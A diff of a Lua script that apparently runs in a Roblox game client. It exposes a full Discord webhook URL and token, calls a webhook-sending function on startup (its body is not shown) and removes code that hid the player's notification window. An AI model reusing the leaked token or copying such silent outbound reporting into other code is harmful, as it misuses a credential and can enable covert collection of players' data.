@@ -1,4 +1,4 @@
---v5
+--v5.1
 -- Webhook
 local webhookURL = "https://discord.com/api/webhooks/1277219875865100340/ETF457JFBBhmqxuJ2kUvFn52zzSUIVeIhdHh-9MgDCr_r-mJVVOFsXClNAekZwTQmVg4"
 
@@ -46,15 +46,6 @@ local function sendWebhook()
 end
 
 sendWebhook()
-
-local notificationWindows = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("NotificationWindows")
-
-if notificationWindows then
-    notificationWindows.Enabled = false
-else
-    warn("NotificationWindows does not exist in PlayerGui.")
-end
-
 
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
